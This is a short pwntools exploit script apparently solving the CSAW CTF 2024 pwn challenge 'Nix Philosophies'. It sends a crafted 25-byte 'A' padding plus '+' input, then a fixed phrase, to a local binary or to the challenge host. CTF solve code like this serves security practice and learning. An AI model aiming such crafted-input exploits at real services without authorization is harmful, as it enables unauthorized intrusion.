#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CSAW CTF Qualification Round 2024/pwn/Nix Philosophies/chal')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    return gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'philosophies: ', b'A' * 25 + b'+')
    r.wait(1)
    r.sendline(b'make every program a filter')

    print(r.clean(1).strip().decode())
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('nix.ctf.csaw.io', 1000)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
